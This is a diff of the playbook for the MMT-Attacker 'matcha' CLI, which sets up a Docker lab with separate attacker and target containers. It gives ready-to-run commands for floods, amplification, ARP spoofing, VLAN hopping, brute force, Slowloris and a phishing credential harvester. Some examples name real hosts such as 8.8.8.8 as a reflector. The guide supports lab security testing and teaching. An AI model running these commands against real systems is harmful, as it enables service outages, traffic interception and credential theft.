@@ -1,6 +1,8 @@
-# MMT-Attacker CLI Playbook
+# MMT-Attacker Playbook
 
-This playbook provides detailed guidelines for using the MMT-Attacker CLI to perform simulation attacks, either via PCAP replay or using built-in attack scripts.
+Step-by-step attack guides for the `matcha` CLI. The primary workflow uses
+the **two-container Docker setup** — one attacker container, one vulnerable
+target — so attacks stay isolated and require no host configuration.
 
 ## Legal Warning ⚠️
 
@@ -13,99 +15,258 @@ This tool is for **EDUCATIONAL AND TESTING PURPOSES ONLY**. Users must:
 
 Improper use of this tool may be illegal and result in criminal charges.
 
+---
+
 ## Table of Contents
-- [Legal Warning ⚠️](#legal-warning-)
-- [Table of Contents](#table-of-contents)
-- [Prerequisites](#prerequisites)
-- [Installation](#installation)
-- [Basic Usage](#basic-usage)
-- [Understanding Attack Types](#understanding-attack-types)
-  - [Attack Flow Overview](#attack-flow-overview)
-- [Attack Types](#attack-types)
-  - [Network-Layer Attacks](#network-layer-attacks)
-    - [ARP Spoofing](#arp-spoofing)
-    - [SYN Flood](#syn-flood-attack)
-    - [DNS Amplification](#dns-amplification-attack)
-    - [Ping of Death](#ping-of-death-attack)
-  - [Application-Layer Attacks](#application-layer-attacks)
-    - [HTTP DoS](#http-dos-attack)
-    - [Slowloris](#slowloris-attack)
-    - [SSH Brute Force](#ssh-brute-force-attack)
-    - [SQL Injection](#sql-injection-attack)
-    - [Credential Harvester](#credential-harvester-attack)
-  - [PCAP Replay Attacks](#pcap-replay-attacks)
+
+- [Setup: Two-Container Lab](#setup-two-container-lab)
+- [Attack Flow Overview](#attack-flow-overview)
+- [Network-Layer Attacks](#network-layer-attacks)
+  - [SYN Flood](#syn-flood)
+  - [ICMP Flood](#icmp-flood)
+  - [UDP Flood](#udp-flood)
+  - [ARP Spoofing](#arp-spoofing)
+  - [DNS Amplification](#dns-amplification)
+  - [Ping of Death](#ping-of-death)
+  - [DHCP Starvation](#dhcp-starvation)
+  - [MAC Flooding](#mac-flooding)
+  - [VLAN Hopping](#vlan-hopping)
+  - [Smurf Attack](#smurf-attack)
+  - [NTP Amplification](#ntp-amplification)
+  - [BGP Hijacking](#bgp-hijacking)
+- [Application-Layer Attacks](#application-layer-attacks)
+  - [HTTP DoS](#http-dos)
+  - [HTTP Flood](#http-flood)
+  - [Slowloris](#slowloris)
+  - [SSH Brute Force](#ssh-brute-force)
+  - [FTP Brute Force](#ftp-brute-force)
+  - [RDP Brute Force](#rdp-brute-force)
+  - [SQL Injection](#sql-injection)
+  - [XSS](#xss)
+  - [Directory Traversal](#directory-traversal)
+  - [XXE](#xxe)
+  - [SSL Strip](#ssl-strip)
+  - [Man-in-the-Middle (MITM)](#man-in-the-middle-mitm)
+  - [Credential Harvester](#credential-harvester)
+- [PCAP Replay](#pcap-replay)
+- [Observing the Target](#observing-the-target)
 - [Ethical Considerations](#ethical-considerations)
 - [Troubleshooting](#troubleshooting)
-- [License](#license)
-- [Contact](#contact)
 
-## Prerequisites
+---
 
-- Python 3.7 or higher
-- Root/sudo privileges for certain attacks
-- Network interface in promiscuous mode for packet capture/injection
-- Required Python packages (see requirements.txt)
+## Setup: Two-Container Lab
 
-## Installation
+All examples in this playbook use the Docker Compose lab. This gives you a
+fully isolated environment: the **attacker** container runs the `matcha` CLI,
+the **target** container runs HTTP, SSH, and FTP services.
+
+```
+┌─────────────────────────────┐        ┌──────────────────────────────┐
+│       attacker              │        │         target               │
+│   (matcha CLI image)        │◄──────►│  HTTP :80  SSH :22  FTP :21  │
+│                             │        │  (nginx + openssh + vsftpd)  │
+└─────────────────────────────┘        └──────────────────────────────┘
+              └─────────────── lab (bridge network) ────────────────┘
+```
+
+### Prerequisites
+
+- [Docker](https://docs.docker.com/get-docker/) installed and running
+- Docker Compose v2 (`docker compose version`)
+
+### Start the lab
 
 ```bash
-# Clone the repository
-git clone https://github.com/montimage/mmt-attacker.git
+git clone https://github.com/Montimage/mmt-attacker.git
 cd mmt-attacker
-
-# Install dependencies
-pip install -r requirements.txt
-
-# Verify installation
-python src/cli.py --help
+docker compose up --build -d
 ```
 
-## Basic Usage
+Verify both containers are running:
 
-The CLI follows this general syntax:
 ```bash
-python src/cli.py <attack-type> [options]
+docker compose ps
 ```
 
-Available attack types:
-- `arp-spoof`: ARP spoofing attack
-- `syn-flood`: SYN flood attack
-- `dns-amplification`: DNS amplification attack
-- `http-dos`: HTTP DoS attack
-- `slowloris`: Slowloris attack
-- `ssh-brute-force`: SSH brute force attack
-- `sql-injection`: SQL injection attack
-- `pcap-replay`: PCAP replay attack
-- `ping-of-death`: Ping of Death attack
-- `credential-harvester`: Credential harvesting attack
+```
+NAME        IMAGE                                    STATUS    PORTS
+attacker    mmt-attacker-attacker                    running
+target      mmt-attacker-target                     running   0.0.0.0:8080->80/tcp, ...
+```
 
-## Understanding Attack Types
+Verify the target is reachable:
 
-This section provides detailed explanations and diagrams for each type of attack supported by MMT-Attacker.
+```bash
+# From the host
+curl http://localhost:8080
 
-### Attack Flow Overview
+# From inside the attacker container
+docker compose exec attacker curl -s http://target
+```
+
+### Get the target IP
+
+Attack parameters that accept `--target-ip` require an IP address, not a
+hostname. Resolve it once before running attacks:
+
+```bash
+TARGET_IP=$(docker compose exec attacker sh -c "getent hosts target | awk '{print \$1}'")
+echo $TARGET_IP   # e.g. 172.20.0.2
+```
+
+Use `$TARGET_IP` in all commands below.
+
+### Running attacks
+
+All attacks use `docker compose exec attacker matcha <attack>`. Pass the
+resolved IP from above as `--target-ip`.
+
+```bash
+# General pattern
+docker compose exec attacker matcha <attack> --target-ip $TARGET_IP [options]
+
+# List all available attacks
+docker compose exec attacker matcha list
+
+# Get help for a specific attack
+docker compose exec attacker matcha info syn-flood
+```
+
+### Tear down
+
+```bash
+docker compose down
+```
+
+> **Note:** To run attacks without Docker, install the CLI directly:
+> `pip install mmt-attacker` or `pip install -e .`
+> Then replace `docker compose exec attacker matcha` with `matcha` in every
+> command below. Root/sudo is required for raw-socket attacks.
+
+---
+
+## Attack Flow Overview
 
 ```mermaid
 graph TB
-    A[Select Attack Type] --> B[Configure Parameters]
-    B --> C[Execute Attack]
-    C --> D[Monitor Progress]
-    D --> E{Attack Success?}
-    E -->|Yes| F[Collect Results]
-    E -->|No| G[Adjust Parameters]
-    G --> B
+    A[Select Attack] --> B[Configure Parameters]
+    B --> C[docker compose exec attacker matcha &lt;attack&gt;]
+    C --> D[Validate inputs]
+    D --> E[Execute attack]
+    E --> F[Structured log output]
+    F --> G{Observe target}
+    G -->|Logs / netstat| H[Analyse results]
+    G -->|Unexpected| I[Adjust parameters]
+    I --> B
 ```
 
-## Attack Types
+---
 
-### Network-Layer Attacks
+## Network-Layer Attacks
 
-#### ARP Spoofing
+### SYN Flood
 
-**Description:**  
-ARP spoofing is a technique that manipulates the Address Resolution Protocol (ARP) to intercept network traffic between targets. The attacker sends falsified ARP messages to link their MAC address with the IP of a legitimate network resource (like the gateway), causing traffic to be redirected through the attacker's machine.
+Exploits the TCP three-way handshake. The attacker sends SYN packets with
+spoofed source addresses; the target exhausts connection resources waiting for
+ACKs that never arrive.
 
-**Attack Flow:**
+```mermaid
+graph LR
+    A[Attacker] -->|SYN| T[Target]
+    T -->|SYN-ACK| D1[Drop]
+    A -->|SYN| T
+    T -->|SYN-ACK| D2[Drop]
+```
+
+**Target services:** HTTP (:80), any open TCP port.
+
+```bash
+# Basic — flood the target's web port
+docker compose exec attacker \
+  matcha syn-flood \
+    --target-ip $TARGET_IP \
+    --target-port 80 \
+    --count 500
+
+# With more options
+docker compose exec attacker \
+  matcha syn-flood \
+    --target-ip $TARGET_IP \
+    --target-port 80 \
+    --count 1000 \
+    --interface eth0
+```
+
+**Key parameters:**
+- `--target-ip` — target IP or hostname
+- `--target-port` — TCP port
+- `--count` — number of SYN packets to send
+- `--interface` — network interface (default: auto)
+
+**Safety:** start with low counts; monitor target with `netstat -ant`.
+
+---
+
+### ICMP Flood
+
+Overwhelms a target with ICMP Echo Request packets, consuming bandwidth and
+CPU as the target generates replies.
+
+```mermaid
+graph LR
+    A[Attacker] -->|ICMP Echo Request| T[Target]
+    T -->|ICMP Echo Reply| A
+```
+
+```bash
+docker compose exec attacker \
+  matcha icmp-flood \
+    --target-ip $TARGET_IP \
+    --count 1000
+```
+
+**Key parameters:**
+- `--target-ip` — target IP or hostname
+- `--count` — number of packets
+
+---
+
+### UDP Flood
+
+Sends high-volume UDP packets to random or specific ports, consuming bandwidth
+and forcing the target to issue ICMP Port Unreachable responses.
+
+```mermaid
+sequenceDiagram
+    participant A as Attacker
+    participant T as Target
+    loop Flood
+        A->>T: UDP Packet (Random Port)
+        T->>A: ICMP Port Unreachable
+    end
+```
+
+```bash
+docker compose exec attacker \
+  matcha udp-flood \
+    --target-ip $TARGET_IP \
+    --target-port 80 \
+    --count 500
+```
+
+**Key parameters:**
+- `--target-ip` — target IP or hostname
+- `--target-port` — UDP port
+- `--count` — number of packets
+
+---
+
+### ARP Spoofing
+
+Sends falsified ARP messages to associate the attacker's MAC with another
+host's IP, redirecting traffic through the attacker.
+
 ```mermaid
 sequenceDiagram
     participant A as Attacker
@@ -115,171 +276,244 @@ sequenceDiagram
     A->>G: Fake ARP: "I am Victim"
     V->>A: Traffic meant for Gateway
     A->>G: Forward traffic
-    G->>A: Response
-    A->>V: Forward response
 ```
 
-**Key Features:**
-- Bidirectional traffic interception
-- MAC address spoofing
-- Automatic network restoration
-- Real-time traffic monitoring
-
-**Parameters:**
-- `--target`: Target IP address to intercept traffic from
-- `--gateway`: Gateway IP address to impersonate
-- `--interface`: Network interface to use
-- `--target-mac`: Target's MAC address (optional, auto-detected if not specified)
-- `--bidirectional`: Intercept traffic in both directions
-- `--aggressive`: Send ARP packets more frequently
-- `--restore-on-exit`: Restore original ARP tables on exit
-- `--packet-log`: Path to save intercepted packets
-- `--verify`: Verify the attack is working
-
-**Example Usage:**
 ```bash
-# Basic ARP spoofing - Minimal setup
-python src/cli.py arp-spoof \
-    --target 192.168.1.100 \
-    --gateway 192.168.1.1 \
-    --interface eth0
-
-# Advanced ARP spoofing - Full control
-python src/cli.py arp-spoof \
-    --target 192.168.1.100 \
-    --target-mac 00:11:22:33:44:55 \
-    --gateway 192.168.1.1 \
-    --interface eth0 \
-    --bidirectional \
-    --aggressive \
-    --restore-on-exit \
-    --packet-log /path/to/log.pcap \
-    --verify
+# Replace IPs with addresses from the lab network
+docker compose exec attacker \
+  matcha arp-spoof \
+    --target-ip <victim-ip> \
+    --gateway-ip <gateway-ip>
 ```
 
-**Attack Scenarios:**
-1. Network Traffic Monitoring
-   ```bash
-   # Monitor all traffic between target and gateway
-   python src/cli.py arp-spoof \
-       --target 192.168.1.100 \
-       --gateway 192.168.1.1 \
-       --interface eth0 \
-       --bidirectional \
-       --packet-log captured_traffic.pcap
-   ```
+**Key parameters:**
+- `--target-ip` — victim IP
+- `--gateway-ip` — gateway IP to impersonate
+- `--interface` — network interface
 
-2. Selective Traffic Interception
-   ```bash
-   # Target specific host with verification
-   python src/cli.py arp-spoof \
-       --target 192.168.1.100 \
-       --gateway 192.168.1.1 \
-       --interface eth0 \
-       --verify \
-       --restore-on-exit
-   ```
+**Safety:** always ensure ARP tables are restored after the test.
 
-**Safety Considerations:**
-- Always use `--restore-on-exit` to prevent network disruption
-- Monitor network stability during the attack
-- Be cautious with `--aggressive` mode as it may flood the network
-- Keep logs for analysis and troubleshooting
+---
 
-#### SYN Flood
+### DNS Amplification
 
-**Description:**  
-SYN Flood is a denial-of-service attack that exploits the TCP three-way handshake. The attacker sends multiple SYN packets with spoofed source addresses, causing the target to exhaust its connection resources waiting for responses that will never come.
+Sends DNS queries with a spoofed source IP (the victim's address) to open
+resolvers. Responses are much larger than queries, amplifying traffic toward
+the victim.
 
-**Attack Flow:**
 ```mermaid
-graph LR
-    A[Attacker] -->|SYN| T[Target]
-    T -->|SYN-ACK| D1[Drop]
-    A -->|SYN| T
-    T -->|SYN-ACK| D2[Drop]
-    A -->|SYN| T
-    T -->|SYN-ACK| D3[Drop]
+sequenceDiagram
+    participant A as Attacker
+    participant D as DNS Servers
+    participant V as Victim
+    Note over A,D: Small query, spoofed source = victim
+    A->>D: ANY example.com (50 bytes)
+    D->>V: Full DNS record set (4000+ bytes)
+    Note over V: Amplification ~80x
 ```
 
-**Key Features:**
-- Randomized source IP addresses
-- Customizable packet parameters
-- Port range targeting
-- Connection tracking
-- Multi-threaded operation
-
-**Parameters:**
-- `--target`: Target IP address to flood
-- `--port`: Single port to target
-- `--port-range`: Range of ports to target (e.g., 80-85)
-- `--interface`: Network interface to use
-- `--threads`: Number of parallel attack threads
-- `--source-ip`: Source IP (use 'random' for spoofing)
-- `--randomize-source`: Randomize source ports
-- `--payload-size`: Size of TCP payload in bytes
-- `--window-size`: TCP window size
-- `--flags`: TCP flags to set (e.g., "SA" for SYN-ACK)
-- `--packet-log`: Path to save attack packets
-
-**Example Usage:**
 ```bash
-# Basic SYN flood - Single port
-python src/cli.py syn-flood \
-    --target 192.168.1.100 \
-    --port 80 \
-    --threads 4
-
-# Advanced SYN flood - Multiple ports with customization
-python src/cli.py syn-flood \
-    --target 192.168.1.100 \
-    --port-range 80-85 \
-    --interface eth0 \
-    --source-ip random \
-    --randomize-source \
-    --payload-size 100 \
-    --window-size 16384 \
-    --flags "SA" \
-    --packet-log /path/to/log.pcap
+docker compose exec attacker \
+  matcha dns-amplification \
+    --target-ip <victim-ip> \
+    --dns-server 8.8.8.8 \
+    --query-domain example.com
 ```
 
-**Attack Scenarios:**
-1. Basic Service Disruption
-   ```bash
-   # Target web server with moderate load
-   python src/cli.py syn-flood \
-       --target 192.168.1.100 \
-       --port 80 \
-       --threads 8 \
-       --randomize-source
-   ```
+**Key parameters:**
+- `--target-ip` — victim IP (receives amplified traffic)
+- `--dns-server` — reflector DNS server
+- `--query-domain` — domain to query
 
-2. Multi-Service Attack
-   ```bash
-   # Target multiple services with custom parameters
-   python src/cli.py syn-flood \
-       --target 192.168.1.100 \
-       --port-range 80-443 \
-       --threads 4 \
-       --source-ip random \
-       --payload-size 120
-   ```
+> Use only in fully isolated lab networks. Never point at real infrastructure.
 
-**Safety Considerations:**
-- Start with low thread count and increase gradually
-- Monitor target's response and network congestion
-- Be cautious with payload size to avoid network saturation
-- Use packet logging for analysis and troubleshooting
-- Consider impact on intermediate network devices
+---
 
-### Application-Layer Attacks
+### Ping of Death
 
-#### HTTP DoS
+Sends oversized ICMP packets (> 65535 bytes fragmented) that cause buffer
+overflows on vulnerable systems during reassembly.
 
-**Description:**  
-HTTP DoS (Denial of Service) attack targets web applications by overwhelming them with a high volume of HTTP requests. This attack can exhaust server resources, bandwidth, or application worker pools, making the service unavailable to legitimate users.
+```mermaid
+sequenceDiagram
+    participant A as Attacker
+    participant T as Target
+    A->>T: ICMP Fragment 1
+    A->>T: ICMP Fragment 2
+    A->>T: ICMP Fragment N
+    Note over T: Buffer overflow on reassembly
+```
 
-**Attack Flow:**
+```bash
+docker compose exec attacker \
+  matcha ping-of-death \
+    --target-ip $TARGET_IP \
+    --count 10
+```
+
+**Key parameters:**
+- `--target-ip` — target IP or hostname
+- `--count` — number of oversized packets
+
+---
+
+### DHCP Starvation
+
+Exhausts the DHCP server's IP pool by sending DISCOVER requests with randomly
+generated MAC addresses.
+
+```mermaid
+sequenceDiagram
+    loop Multiple fake MACs
+        A->>D: DHCP DISCOVER (Random MAC)
+        D->>A: DHCP OFFER
+        A->>D: DHCP REQUEST
+        D->>A: DHCP ACK
+        Note over D: IP Pool Shrinks
+    end
+```
+
+```bash
+docker compose exec attacker \
+  matcha dhcp-starvation \
+    --interface eth0 \
+    --count 200
+```
+
+**Key parameters:**
+- `--interface` — network interface
+- `--count` — number of spoofed requests
+
+**Safety:** can disrupt legitimate DHCP clients on the same segment.
+
+---
+
+### MAC Flooding
+
+Overwhelms a switch's MAC address table with random source MACs, forcing
+fail-open mode where the switch broadcasts all frames.
+
+```mermaid
+graph TB
+    A[Attacker] -->|Frame: Random MAC 1| S[Switch]
+    A -->|Frame: Random MAC 2| S
+    A -->|Frame: Random MAC N| S
+    Note["MAC table full → fail-open"] --> S
+```
+
+```bash
+docker compose exec attacker \
+  matcha mac-flooding \
+    --interface eth0 \
+    --count 5000
+```
+
+**Key parameters:**
+- `--interface` — network interface
+- `--count` — number of frames
+
+---
+
+### VLAN Hopping
+
+Uses double-tagged frames to bypass VLAN isolation and reach a separate VLAN.
+
+```mermaid
+sequenceDiagram
+    A->>S: Frame: Outer VLAN 10, Inner VLAN 20
+    Note over S: Strip outer tag
+    S->>T: Frame forwarded to VLAN 20
+```
+
+```bash
+docker compose exec attacker \
+  matcha vlan-hopping \
+    --interface eth0 \
+    --outer-vlan 10 \
+    --inner-vlan 20 \
+    --target-ip <target-ip>
+```
+
+**Key parameters:**
+- `--interface` — network interface
+- `--outer-vlan` / `--inner-vlan` — VLAN IDs
+- `--target-ip` — target on the inner VLAN
+
+---
+
+### Smurf Attack
+
+Amplification attack: ICMP broadcast to a network with a spoofed source of the
+victim's IP causes all hosts to reply to the victim.
+
+```mermaid
+sequenceDiagram
+    A->>B: ICMP Echo (Spoofed Source: Victim)
+    B->>V: ICMP Replies from All Hosts
+    Note over V: Bandwidth exhaustion
+```
+
+```bash
+docker compose exec attacker \
+  matcha smurf-attack \
+    --victim <victim-ip> \
+    --broadcast <broadcast-ip> \
+    --count 100
+```
+
+**Key parameters:**
+- `--victim` — victim IP
+- `--broadcast` — broadcast address of the network
+
+---
+
+### NTP Amplification
+
+Exploits NTP `monlist` to return large responses to a spoofed victim IP,
+achieving ~500× amplification.
+
+```mermaid
+sequenceDiagram
+    A->>N: NTP monlist (Spoofed: Victim)
+    N->>V: Large NTP Response (~500x)
+```
+
+```bash
+docker compose exec attacker \
+  matcha ntp-amplification \
+    --victim <victim-ip> \
+    --ntp-servers "1.2.3.4,5.6.7.8" \
+    --count 50
+```
+
+**Key parameters:**
+- `--victim` — victim IP
+- `--ntp-servers` — comma-separated NTP reflector list
+- `--count` — number of queries
+
+---
+
+### BGP Hijacking
+
+Educational simulation of BGP route announcement manipulation.
+
+```bash
+docker compose exec attacker \
+  matcha bgp-hijacking \
+    --prefix 1.2.3.0/24 \
+    --as-number 65000
+```
+
+> This is a simulation — no real routing infrastructure is modified.
+
+---
+
+## Application-Layer Attacks
+
+### HTTP DoS
+
+Floods a web server with high-volume HTTP requests using multiple threads.
+
 ```mermaid
 sequenceDiagram
     participant A as Attacker
@@ -290,963 +524,233 @@ sequenceDiagram
     end
 ```
 
-**Key Features:**
-- Multiple HTTP methods support (GET, POST, etc.)
-- Custom headers and cookies
-- Random path generation
-- Request rate control
-- Multi-threaded operation
-- Response verification
-
-**Parameters:**
-- `--target`: Target URL (e.g., http://example.com)
-- `--method`: HTTP method (GET, POST, etc.)
-- `--path`: Specific URL path to target
-- `--headers`: Custom HTTP headers as JSON
-- `--cookies`: Custom cookies as JSON
-- `--data`: POST data as JSON
-- `--threads`: Number of parallel threads
-- `--random-path`: Generate random paths
-- `--verify-success`: Verify successful requests
-- `--timeout`: Request timeout in seconds
-- `--rate-limit`: Requests per second per thread
-
-**Example Usage:**
 ```bash
-# Basic HTTP DoS - Simple GET flood
-python src/cli.py http-dos \
-    --target http://example.com \
+# Basic GET flood against the target's nginx
+docker compose exec attacker \
+  matcha http-dos \
+    --target-url http://target \
     --threads 10
 
-# Advanced HTTP DoS - Custom POST with headers
-python src/cli.py http-dos \
-    --target http://example.com \
-    --method POST \
-    --path /api/endpoint \
-    --headers '{"X-Custom": "value"}' \
-    --cookies '{"session": "abc123"}' \
-    --data '{"key": "value"}' \
-    --random-path \
-    --verify-success
+# With more control
+docker compose exec attacker \
+  matcha http-dos \
+    --target-url http://target \
+    --threads 20 \
+    --timeout 5
 ```
 
-**Attack Scenarios:**
-1. Basic Web Server Stress Test
-   ```bash
-   # High-volume GET requests
-   python src/cli.py http-dos \
-       --target http://example.com \
-       --threads 20 \
-       --timeout 5 \
-       --rate-limit 100
-   ```
+**Key parameters:**
+- `--target-url` — full URL including scheme
+- `--threads` — parallel request threads
+- `--timeout` — per-request timeout (seconds)
 
-2. API Endpoint Testing
-   ```bash
-   # Target specific API with authentication
-   python src/cli.py http-dos \
-       --target http://example.com/api \
-       --method POST \
-       --headers '{"Authorization": "Bearer test"}' \
-       --data '{"test": "data"}' \
-       --threads 5 \
-       --verify-success
-   ```
+Watch the target's nginx log while this runs:
 
-**Safety Considerations:**
-- Start with low thread count and rate limits
-- Monitor server response times and error rates
-- Be cautious with random path generation
-- Verify impact on application resources
-- Consider effects on shared hosting environments
+```bash
+docker compose exec target tail -f /var/log/nginx/access.log
+```
 
-#### Slowloris
+---
 
-**Description:**  
-Slowloris is a low-bandwidth denial of service attack that works by maintaining many partial HTTP connections to the target web server. It sends HTTP requests in pieces very slowly, keeping connections open for as long as possible. This exhausts the server's connection pool, preventing legitimate users from connecting.
+### HTTP Flood
 
-**Attack Flow:**
+Similar to HTTP DoS but focuses on connection-level flooding.
+
+```bash
+docker compose exec attacker \
+  matcha http-flood \
+    --url http://target \
+    --count 1000 \
+    --threads 10
+```
+
+**Key parameters:**
+- `--url` — target URL
+- `--count` — total requests
+- `--threads` — parallel threads
+
+---
+
+### Slowloris
+
+Maintains many partial HTTP connections to exhaust the server's connection pool
+without generating high bandwidth.
+
 ```mermaid
 graph TB
     A[Attacker] -->|Partial HTTP Request 1| S[Server]
     A -->|Partial HTTP Request 2| S
-    A -->|Partial HTTP Request 3| S
-    A -->|Keep-Alive Headers| S
-    A -->|Periodic Headers| S
-    Note["Keep connections open
-by sending periodic
-partial headers"] --> A
+    A -->|Keep-Alive Headers...| S
+    Note["Server connection pool exhausted"] --> S
 ```
 
-**Key Features:**
-- Connection pool management
-- Customizable timing intervals
-- SSL/TLS support
-- Server resource monitoring
-- Low bandwidth consumption
-- Difficult to detect and filter
-
-**Parameters:**
-- `--target`: Target hostname or IP
-- `--port`: Target port (default: 80, 443 for SSL)
-- `--ssl`: Use SSL/TLS connection
-- `--connections`: Number of connections to maintain
-- `--keep-alive`: Keep-alive interval in seconds
-- `--interval`: Interval between sending headers
-- `--socket-timeout`: Socket timeout in seconds
-- `--verify-vuln`: Test if target is vulnerable
-- `--user-agent`: Custom User-Agent string
-- `--proxy`: HTTP/SOCKS proxy for connections
-
-**Example Usage:**
 ```bash
-# Basic Slowloris - Simple connection exhaustion
-python src/cli.py slowloris \
-    --target example.com \
-    --connections 150
-
-# Advanced Slowloris - Fine-tuned with SSL
-python src/cli.py slowloris \
-    --target example.com \
-    --port 443 \
-    --ssl \
-    --connections 200 \
-    --keep-alive 10 \
-    --interval 15 \
-    --socket-timeout 30 \
-    --verify-vuln
+docker compose exec attacker \
+  matcha slowloris \
+    --target-url http://target \
+    --connections 50
 ```
 
-**Attack Scenarios:**
-1. Basic Web Server Test
-   ```bash
-   # Test with minimal connections
-   python src/cli.py slowloris \
-       --target example.com \
-       --connections 100 \
-       --verify-vuln \
-       --interval 30
-   ```
+**Key parameters:**
+- `--target-url` — target URL
+- `--connections` — number of slow connections to maintain
 
-2. Secure Server Testing
-   ```bash
-   # Test SSL with custom configuration
-   python src/cli.py slowloris \
-       --target example.com \
-       --ssl \
-       --port 443 \
-       --connections 150 \
-       --user-agent "Mozilla/5.0" \
-       --proxy "socks5://127.0.0.1:9050"
-   ```
+---
 
-**Safety Considerations:**
-- Start with a low number of connections
-- Monitor server's response time and error logs
-- Be aware of server's connection timeout settings
-- Use `--verify-vuln` before full attack
-- Consider impact on shared hosting environments
-- Monitor local resource usage
+### SSH Brute Force
 
-### Amplification Attacks
+Systematically tries username/password combinations against an SSH server.
+The target container exposes SSH on port 22 with `demo:password123`.
 
-#### DNS Amplification
-
-**Description:**  
-DNS Amplification is a DDoS attack that exploits DNS resolvers to overwhelm a target with amplified traffic. The attacker sends DNS queries with a spoofed source IP (the victim's IP) to multiple DNS servers. The responses are much larger than the queries, creating an amplification effect that floods the target.
-
-**Attack Flow:**
-```mermaid
-sequenceDiagram
-    participant A as Attacker
-    participant D as DNS Servers
-    participant V as Victim
-    Note over A,D: Small DNS query with spoofed source IP
-    A->>D: Query type ANY for example.com (50 bytes)
-    Note over D,V: Large DNS response (4000+ bytes)
-    D->>V: Complete DNS record set
-    Note over V: Amplification factor: ~80x
-```
-
-**Key Features:**
-- Multiple DNS server support
-- Query type selection
-- Amplification factor verification
-- DNS server rotation
-- Traffic volume monitoring
-- Automatic server filtering
-
-**Parameters:**
-- `--target`: Target IP address to attack
-- `--dns-server`: Single DNS server to use
-- `--dns-servers-file`: File containing list of DNS servers
-- `--query-domain`: Domain to query
-- `--query-type`: DNS query type (e.g., ANY, TXT)
-- `--recursive`: Enable recursive queries
-- `--rotate-dns`: Rotate through DNS servers
-- `--verify-amplification`: Verify amplification ratio
-- `--amplification-threshold`: Minimum amplification ratio
-- `--interval`: Delay between queries
-- `--threads`: Number of parallel threads
-
-**Example Usage:**
-```bash
-# Basic DNS amplification - Single server
-python src/cli.py dns-amplification \
-    --target 192.168.1.100 \
-    --dns-server 8.8.8.8 \
-    --query-domain example.com
-
-# Advanced DNS amplification - Multiple servers
-python src/cli.py dns-amplification \
-    --target 192.168.1.100 \
-    --dns-servers-file dns_servers.txt \
-    --query-domain example.com \
-    --query-type ANY \
-    --recursive \
-    --rotate-dns \
-    --verify-amplification \
-    --amplification-threshold 10.0
-```
-
-**Attack Scenarios:**
-1. Basic Amplification Test
-   ```bash
-   # Test with single DNS server
-   python src/cli.py dns-amplification \
-       --target 192.168.1.100 \
-       --dns-server 8.8.8.8 \
-       --query-domain example.com \
-       --verify-amplification
-   ```
-
-2. Distributed Amplification
-   ```bash
-   # Use multiple DNS servers with rotation
-   python src/cli.py dns-amplification \
-       --target 192.168.1.100 \
-       --dns-servers-file resolvers.txt \
-       --query-type ANY \
-       --rotate-dns \
-       --threads 4 \
-       --interval 0.5
-   ```
-
-**Safety Considerations:**
-- Verify DNS server responses before attack
-- Monitor network bandwidth consumption
-- Be cautious with number of parallel threads
-- Consider impact on DNS infrastructure
-- Use appropriate intervals between queries
-- Regularly update DNS server list
-
-### Network-Layer Attacks
-
-#### Ping of Death
-
-**Description:**  
-Ping of Death (PoD) is a denial of service attack that sends oversized or malformed ICMP echo request (ping) packets to a target system. When these packets are fragmented and reassembled at the target, they can cause buffer overflows and system crashes in vulnerable systems.
-
-**Attack Flow:**
-```mermaid
-sequenceDiagram
-    participant A as Attacker
-    participant T as Target
-    Note over A: Generate Oversized Packet
-    A->>T: Fragment 1 (ICMP Echo Request)
-    A->>T: Fragment 2
-    A->>T: Fragment N
-    Note over T: Buffer Overflow on Reassembly
-    Note over T: System Crash
-```
-
-**Key Features:**
-- Oversized packet generation
-- IP fragmentation handling
-- Custom packet size control
-- Multiple target support
-- Response monitoring
-- System impact analysis
-
-**Parameters:**
-- `--target`: Target IP address
-- `--targets-file`: File containing multiple targets
-- `--size`: Packet size (bytes)
-- `--count`: Number of packets to send
-- `--interval`: Delay between packets
-- `--fragment-size`: Size of IP fragments
-- `--interface`: Network interface to use
-- `--verify`: Test for vulnerability
-- `--timeout`: Response timeout
-
-**Example Usage:**
-```bash
-# Basic Ping of Death - Single target
-python src/cli.py ping-of-death \
-    --target 192.168.1.100 \
-    --size 65500
-
-# Advanced Ping of Death - Multiple targets
-python src/cli.py ping-of-death \
-    --targets-file targets.txt \
-    --size 65500 \
-    --count 100 \
-    --interval 0.1 \
-    --fragment-size 1024 \
-    --verify \
-    --timeout 2
-```
-
-**Attack Scenarios:**
-1. Basic System Testing
-   ```bash
-   # Test single system for vulnerability
-   python src/cli.py ping-of-death \
-       --target 192.168.1.100 \
-       --size 65500 \
-       --count 1 \
-       --verify
-   ```
-
-2. Network Stress Test
-   ```bash
-   # Test multiple systems with varied packet sizes
-   python src/cli.py ping-of-death \
-       --targets-file network_hosts.txt \
-       --size 65500 \
-       --count 50 \
-       --interval 0.5 \
-       --fragment-size 1500
-   ```
-
-**Safety Considerations:**
-- Test on isolated systems first
-- Monitor target system stability
-- Start with minimal packet sizes
-- Use appropriate intervals
-- Have system recovery procedures ready
-- Document all testing activities
-
-### Application-Layer Attacks
-
-#### Credential Harvester
-
-**Description:**  
-The Credential Harvester creates convincing phishing pages by cloning legitimate login forms and collecting submitted credentials. This tool helps security teams test user awareness and validate security controls against phishing attacks.
-
-**Attack Flow:**
 ```mermaid
 graph TB
-    Start[Start Server] --> Clone[Clone Target Site]
-    Clone --> Customize[Customize Forms]
-    Customize --> Listen[Listen for Connections]
-    Listen --> Process{Process Request}
-    Process -->|Valid Form| Collect[Collect Credentials]
-    Process -->|Other| Redirect[Redirect to Real Site]
-    Collect --> Log[Log Data]
-    Collect --> Redirect
-```
-
-**Key Features:**
-- Website cloning
-- Form customization
-- SSL/TLS support
-- Real-time monitoring
-- Credential logging
-- Traffic analysis
-- Multiple template support
-
-**Parameters:**
-- `--template`: Predefined template to use
-- `--target-url`: URL to clone
-- `--custom-form`: Path to custom form HTML
-- `--port`: Port to listen on
-- `--ssl`: Enable HTTPS
-- `--cert`: SSL certificate file
-- `--key`: SSL private key file
-- `--redirect`: URL to redirect after submission
-- `--log-file`: File to save captured data
-
-**Example Usage:**
-```bash
-# Basic harvester with default template
-python src/cli.py credential-harvester \
-    --template login-form \
-    --port 80
-
-# Advanced harvester with SSL
-python src/cli.py credential-harvester \
-    --target-url https://example.com/login \
-    --port 443 \
-    --ssl \
-    --cert cert.pem \
-    --key key.pem \
-    --redirect https://real-site.com \
-    --log-file harvest.json
-```
-
-**Attack Scenarios:**
-1. Basic Awareness Testing
-   ```bash
-   # Simple login page clone
-   python src/cli.py credential-harvester \
-       --template corporate-login \
-       --port 8080 \
-       --redirect https://company.com
